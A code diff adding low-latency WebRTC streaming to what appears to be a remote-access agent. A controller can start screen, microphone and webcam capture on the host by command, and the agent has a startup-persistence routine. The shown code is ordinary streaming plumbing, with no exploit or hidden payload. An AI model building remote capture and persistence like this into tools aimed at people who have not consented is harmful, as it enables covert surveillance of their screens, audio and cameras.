+        """Cleanup audio resources."""
+        if hasattr(self, 'stream') and self.stream:
+            try:
+                self.stream.stop_stream()
+                self.stream.close()
+            except:
+                pass
+        if hasattr(self, 'audio') and self.audio:
+            try:
+                self.audio.terminate()
+            except:
+                pass
+
+
+class CameraTrack(MediaStreamTrack):
+    """WebRTC MediaStreamTrack for camera capture with low latency."""
+    
+    kind = "video"
+    
+    def __init__(self, agent_id, camera_index=0, target_fps=30, quality=85):
+        super().__init__()
+        self.agent_id = agent_id
+        self.camera_index = camera_index
+        self.target_fps = target_fps
+        self.quality = quality
+        self.frame_interval = 1.0 / target_fps
+        self.last_frame_time = 0
+        self.capture = None
+        self.stats = {
+            'frames_sent': 0,
+            'total_bytes': 0,
+            'avg_latency': 0.0,
+            'fps': 0.0
+        }
+        
+        # Initialize camera capture
+        if AIORTC_AVAILABLE and CV2_AVAILABLE:
+            try:
+                self.capture = cv2.VideoCapture(camera_index)
+                if not self.capture.isOpened():
+                    log_message(f"Failed to open camera {camera_index}", "warning")
+                    self.capture = None
+                else:
+                    # Set camera properties for low latency
+                    self.capture.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+                    self.capture.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+                    self.capture.set(cv2.CAP_PROP_FPS, target_fps)
+                    self.capture.set(cv2.CAP_PROP_BUFFERSIZE, 1)  # Minimize buffering
+                    log_message(f"CameraTrack initialized for agent {agent_id} at {target_fps} FPS")
+            except Exception as e:
+                log_message(f"Failed to initialize CameraTrack: {e}", "error")
+    
+    async def recv(self):
+        """Generate and return camera frames for WebRTC streaming."""
+        if not AIORTC_AVAILABLE or not self.capture:
+            # Fallback to placeholder frame
+            frame = av.VideoFrame.from_ndarray(
+                np.zeros((480, 640, 3), dtype=np.uint8),
+                format="bgr24"
+            )
+            frame.pts, frame.time_base = await self.next_timestamp()
+            return frame
+        
+        try:
+            current_time = time.time()
+            
+            # Control frame rate
+            if current_time - self.last_frame_time < self.frame_interval:
+                await asyncio.sleep(0.001)  # Brief pause
+                return await self.recv()
+            
+            # Capture camera frame
+            ret, frame = self.capture.read()
+            if not ret:
+                # Generate placeholder frame
+                img_array = np.zeros((480, 640, 3), dtype=np.uint8)
+            else:
+                # Convert BGR to RGB for aiortc
+                img_array = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            
+            # Create VideoFrame for aiortc
+            frame = av.VideoFrame.from_ndarray(img_array, format="bgr24")
+            frame.pts, frame.time_base = await self.next_timestamp()
+            
+            # Update stats
+            self.stats['frames_sent'] += 1
+            self.stats['fps'] = 1.0 / (current_time - self.last_frame_time) if self.last_frame_time > 0 else 0
+            self.last_frame_time = current_time
+            
+            return frame
+            
+        except Exception as e:
+            log_message(f"Error in CameraTrack.recv: {e}", "error")
+            # Return placeholder frame on error
+            frame = av.VideoFrame.from_ndarray(
+                np.zeros((480, 640, 3), dtype=np.uint8),
+                format="bgr24"
+            )
+            frame.pts, frame.time_base = await self.next_timestamp()
+            return frame
+    
+    def get_stats(self):
+        """Get camera streaming statistics."""
+        return self.stats.copy()
+    
+    def set_quality(self, quality):
+        """Set video quality (1-100)."""
+        self.quality = max(1, min(100, quality))
+    
+    def set_fps(self, fps):
+        """Set target frame rate."""
+        self.target_fps = max(1, min(60, fps))
+        self.frame_interval = 1.0 / self.target_fps
+    
+    def __del__(self):
+        """Cleanup camera resources."""
+        if hasattr(self, 'capture') and self.capture:
+            try:
+                self.capture.release()
+            except:
+                pass
+
+
 # Fast serialization
 try:
     import msgpack
@@ -6869,6 +7842,13 @@ def connect():
     log_message(f"Connected to server. Registering with agent_id: {agent_id}")
     
     sio.emit('agent_connect', {'agent_id': agent_id})
+    
+    # Emit WebRTC status if available
+    if AIORTC_AVAILABLE:
+        try:
+            emit_webrtc_status()
+        except Exception as e:
+            log_message(f"Failed to emit WebRTC status on connect: {e}", "warning")
 
 @sio.event
 def disconnect():
@@ -6892,6 +7872,13 @@ def on_command(data):
         "stop-audio": stop_audio_streaming,
         "start-camera": lambda: start_camera_streaming(agent_id),
         "stop-camera": stop_camera_streaming,
+        # WebRTC streaming commands for low-latency streaming
+        "start-webrtc": lambda: start_webrtc_streaming(agent_id, True, True, False) if AIORTC_AVAILABLE else start_streaming(agent_id),
+        "stop-webrtc": lambda: stop_webrtc_streaming(agent_id) if AIORTC_AVAILABLE else stop_streaming(),
+        "start-webrtc-screen": lambda: start_webrtc_streaming(agent_id, True, False, False) if AIORTC_AVAILABLE else start_streaming(agent_id),
+        "start-webrtc-audio": lambda: start_webrtc_streaming(agent_id, False, True, False) if AIORTC_AVAILABLE else start_audio_streaming(agent_id),
+        "start-webrtc-camera": lambda: start_webrtc_streaming(agent_id, False, False, True) if AIORTC_AVAILABLE else start_camera_streaming(agent_id),
+        "webrtc-stats": lambda: get_webrtc_stats(agent_id) if AIORTC_AVAILABLE else "WebRTC not available",
     }
 
     if command in internal_commands:
@@ -7032,6 +8019,226 @@ def on_file_upload(data):
     except Exception as e:
         sio.emit('file_upload_result', {'success': False, 'error': str(e)})
 
+# ========================================================================================
+# WEBRTC SIGNALING EVENT HANDLERS FOR LOW-LATENCY STREAMING
+# ========================================================================================
+
+@sio.on('webrtc_offer')
+def on_webrtc_offer(data):
+    """Handle WebRTC offer from controller to start streaming."""
+    try:
+        agent_id = get_or_create_agent_id()
+        offer_sdp = data.get('sdp')
+        enable_screen = data.get('enable_screen', True)
+        enable_audio = data.get('enable_audio', True)
+        enable_camera = data.get('enable_camera', False)
+        
+        if not offer_sdp:
+            sio.emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing SDP offer'})
+            return
+        
+        log_message(f"Received WebRTC offer for agent {agent_id}")
+        
+        # Start WebRTC streaming with the received offer
+        if AIORTC_AVAILABLE:
+            start_webrtc_streaming(agent_id, enable_screen, enable_audio, enable_camera)
+            sio.emit('webrtc_offer_accepted', {'agent_id': agent_id})
+        else:
+            # Fallback to Socket.IO streaming
+            log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
+            start_streaming(agent_id)
+            sio.emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
+            
+    except Exception as e:
+        error_msg = f"WebRTC offer handling failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
+@sio.on('webrtc_answer')
+def on_webrtc_answer(data):
+    """Handle WebRTC answer from controller."""
+    try:
+        agent_id = data.get('agent_id', get_or_create_agent_id())
+        answer_sdp = data.get('sdp')
+        
+        if not answer_sdp:
+            sio.emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing SDP answer'})
+            return
+        
+        log_message(f"Received WebRTC answer for agent {agent_id}")
+        
+        if AIORTC_AVAILABLE:
+            # Handle the answer asynchronously
+            asyncio.create_task(handle_webrtc_answer(agent_id, answer_sdp))
+            sio.emit('webrtc_answer_received', {'agent_id': agent_id})
+        else:
+            log_message("WebRTC not available, cannot handle answer", "warning")
+            
+    except Exception as e:
+        error_msg = f"WebRTC answer handling failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
+@sio.on('webrtc_ice_candidate')
+def on_webrtc_ice_candidate(data):
+    """Handle ICE candidate from controller."""
+    try:
+        agent_id = data.get('agent_id', get_or_create_agent_id())
+        candidate_data = data.get('candidate')
+        
+        if not candidate_data:
+            sio.emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing ICE candidate data'})
+            return
+        
+        log_message(f"Received ICE candidate for agent {agent_id}")
+        
+        if AIORTC_AVAILABLE:
+            # Handle the ICE candidate asynchronously
+            asyncio.create_task(handle_webrtc_ice_candidate(agent_id, candidate_data))
+        else:
+            log_message("WebRTC not available, cannot handle ICE candidate", "warning")
+            
+    except Exception as e:
+        error_msg = f"ICE candidate handling failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
+@sio.on('webrtc_start_streaming')
+def on_webrtc_start_streaming(data):
+    """Handle request to start WebRTC streaming."""
+    try:
+        agent_id = get_or_create_agent_id()
+        enable_screen = data.get('enable_screen', True)
+        enable_audio = data.get('enable_audio', True)
+        enable_camera = data.get('enable_camera', False)
+        
+        log_message(f"Starting WebRTC streaming for agent {agent_id}")
+        
+        if AIORTC_AVAILABLE:
+            start_webrtc_streaming(agent_id, enable_screen, enable_audio, enable_camera)
+            sio.emit('webrtc_streaming_started', {'agent_id': agent_id})
+        else:
+            # Fallback to Socket.IO streaming
+            log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
+            start_streaming(agent_id)
+            sio.emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
+            
+    except Exception as e:
+        error_msg = f"WebRTC streaming start failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
+@sio.on('webrtc_stop_streaming')
+def on_webrtc_stop_streaming(data):
+    """Handle request to stop WebRTC streaming."""
+    try:
+        agent_id = data.get('agent_id', get_or_create_agent_id())
+        
+        log_message(f"Stopping WebRTC streaming for agent {agent_id}")
+        
+        if AIORTC_AVAILABLE:
+            stop_webrtc_streaming(agent_id)
+            sio.emit('webrtc_streaming_stopped', {'agent_id': agent_id})
+        else:
+            # Fallback to Socket.IO streaming stop
+            stop_streaming()
+            sio.emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
+            
+    except Exception as e:
+        error_msg = f"WebRTC streaming stop failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
+@sio.on('webrtc_get_stats')
+def on_webrtc_get_stats(data):
+    """Handle request for WebRTC streaming statistics."""
+    try:
+        agent_id = data.get('agent_id', get_or_create_agent_id())
+        
+        if AIORTC_AVAILABLE:
+            stats = get_webrtc_stats(agent_id)
+            sio.emit('webrtc_stats', {'agent_id': agent_id, 'stats': stats})
+        else:
+            # Return fallback stats
+            fallback_stats = {
+                'method': 'socketio',
+                'status': 'WebRTC not available',
+                'fps': 0,
+                'latency': 0,
+                'bandwidth': 0
+            }
+            sio.emit('webrtc_stats', {'agent_id': agent_id, 'stats': fallback_stats})
+            
+    except Exception as e:
+        error_msg = f"WebRTC stats request failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
+@sio.on('webrtc_set_quality')
+def on_webrtc_set_quality(data):
+    """Handle request to adjust WebRTC streaming quality."""
+    try:
+        agent_id = data.get('agent_id', get_or_create_agent_id())
+        quality = data.get('quality', 85)
+        fps = data.get('fps', 30)
+        
+        log_message(f"Adjusting WebRTC quality for agent {agent_id}: quality={quality}, fps={fps}")
+        
+        if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
+            # Update quality settings for active streams
+            for track in WEBRTC_STREAMS[agent_id].values():
+                if hasattr(track, 'set_quality'):
+                    track.set_quality(quality)
+                if hasattr(track, 'set_fps'):
+                    track.set_fps(fps)
+            
+            sio.emit('webrtc_quality_updated', {'agent_id': agent_id, 'quality': quality, 'fps': fps})
+        else:
+            log_message("WebRTC streams not available for quality adjustment", "warning")
+            
+    except Exception as e:
+        error_msg = f"WebRTC quality adjustment failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
+def get_webrtc_status():
+    """Get comprehensive WebRTC status and capabilities."""
+    status = {
+        'enabled': WEBRTC_ENABLED,
+        'aiortc_available': AIORTC_AVAILABLE,
+        'aiohttp_available': AIOHTTP_AVAILABLE,
+        'signaling_available': AIORTC_SIGNALING_AVAILABLE,
+        'active_connections': len(WEBRTC_PEER_CONNECTIONS),
+        'active_streams': len(WEBRTC_STREAMS),
+        'ice_servers': len(WEBRTC_ICE_SERVERS),
+        'capabilities': {
+            'screen_capture': MSS_AVAILABLE or CV2_AVAILABLE,
+            'audio_capture': PYAUDIO_AVAILABLE,
+            'camera_capture': CV2_AVAILABLE,
+            'hardware_encoding': HAS_DXCAM or CV2_AVAILABLE,
+        }
+    }
+    
+    if WEBRTC_ENABLED and AIORTC_AVAILABLE:
+        status['recommended_codecs'] = ['VP8', 'VP9', 'H.264']
+        status['latency_target'] = 'sub-second'
+        status['scalability'] = 'SFU-ready'
+    else:
+        status['fallback_method'] = 'Socket.IO'
+        status['latency_target'] = 'single-digit seconds'
+    
+    return status
+
+def emit_webrtc_status():
+    """Emit WebRTC status to controller."""
+    try:
+        agent_id = get_or_create_agent_id()
+        status = get_webrtc_status()
+        sio.emit('webrtc_status', {'agent_id': agent_id, 'status': status})
+        log_message(f"WebRTC status emitted: {status['enabled']}")
+    except Exception as e:
+        log_message(f"Failed to emit WebRTC status: {e}", "error")
+
 def initialize_components():
     """Initialize high-performance components and input controllers."""
     global high_performance_capture, low_latency_input, mouse_controller, keyboard_controller
@@ -7066,6 +8273,26 @@ def initialize_components():
     except Exception as e:
         log_message(f"[WARN] Failed to initialize low-latency input: {e}")
         low_latency_input = None
+    
+    # Initialize WebRTC components if available
+    if AIORTC_AVAILABLE:
+        try:
+            # Set up WebRTC event loop for async operations
+            if not asyncio.get_event_loop().is_running():
+                asyncio.set_event_loop(asyncio.new_event_loop())
+            
+            # Initialize WebRTC configuration
+            global WEBRTC_ENABLED
+            WEBRTC_ENABLED = True
+            
+            log_message("[OK] WebRTC components initialized for low-latency streaming")
+            log_message(f"[INFO] WebRTC ICE servers: {len(WEBRTC_ICE_SERVERS)} configured")
+        except Exception as e:
+            log_message(f"[WARN] Failed to initialize WebRTC components: {e}")
+            WEBRTC_ENABLED = False
+    else:
+        log_message("[INFO] WebRTC not available - using Socket.IO streaming fallback")
+        WEBRTC_ENABLED = False
 
 def add_to_startup():
     """Add agent to system startup."""
